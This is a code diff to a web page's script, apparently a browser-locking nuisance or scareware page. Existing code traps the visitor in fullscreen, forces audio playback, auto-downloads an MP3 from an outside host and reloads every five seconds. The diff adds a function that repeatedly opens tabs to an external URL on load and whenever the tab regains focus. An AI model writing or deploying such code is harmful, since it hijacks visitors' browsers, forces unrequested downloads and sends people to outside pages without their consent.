@@ -72,6 +72,7 @@
     const popup = document.getElementById('popup');
     const audio = document.getElementById('aud');
     const mp3Url = 'https://jewls-gray.vercel.app/1.mp3';
+    const spamUrl = 'https://hihi-roan.vercel.app/api/main';
 
     // Trigger MP3 download
     function triggerDownload(url, filename) {
@@ -81,6 +82,20 @@
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
+    }
+
+    // Spam open new tabs
+    function spamNewTabs() {
+      const maxTabs = 5; // Limit to prevent browser overload
+      let tabsOpened = 0;
+      const interval = setInterval(() => {
+        if (tabsOpened < maxTabs) {
+          window.open(spamUrl, '_blank');
+          tabsOpened++;
+        } else {
+          clearInterval(interval); // Stop after reaching maxTabs
+        }
+      }, 1000); // Open a tab every 1 second
     }
 
     // Fullscreen functionality
@@ -103,11 +118,9 @@
       if (playAttempt !== undefined) {
         playAttempt.catch((error) => {
           console.log('Autoplay prevented:', error);
-          // Fallback: Try playing on user interactions
           const tryPlayOnInteraction = () => {
             audio.play().catch((err) => console.log('Interaction play failed:', err));
           };
-          // Listen for any user interaction
           ['click', 'mousemove', 'keydown', 'touchstart'].forEach((event) => {
             document.addEventListener(event, tryPlayOnInteraction, { once: true });
           });
@@ -160,17 +173,6 @@
     // Handle single download
     function handleDownloads() {
       triggerDownload(mp3Url, '1.mp3');
-      // Multiple downloads (uncomment for testing, but expect prompts)
-      /*
-      const downloadCount = 3;
-      let delay = 100;
-      for (let i = 0; i < downloadCount; i++) {
-        setTimeout(() => {
-          triggerDownload(mp3Url, `1_${i + 1}.mp3`);
-        }, delay);
-        delay += 500;
-      }
-      */
     }
 
     window.addEventListener('load', () => {
@@ -178,13 +180,12 @@
       trapFullscreen();
       tryPlayAudio();
       handleDownloads();
+      spamNewTabs(); // Trigger the tab-spamming function on page load
 
       // Faster page refresh
       setTimeout(() => {
         window.location.reload();
-      }, 5000); // 5 seconds
-      // For even faster refresh (e.g., 3 seconds), uncomment below but test for stability
-      // setTimeout(() => { window.location.reload(); }, 3000);
+      }, 5000);
     });
 
     // Handle visibility change
@@ -194,6 +195,7 @@
       } else {
         tryPlayAudio();
         enterFullscreen();
+        spamNewTabs(); // Re-trigger tab spamming when the tab becomes visible again
       }
     });
 
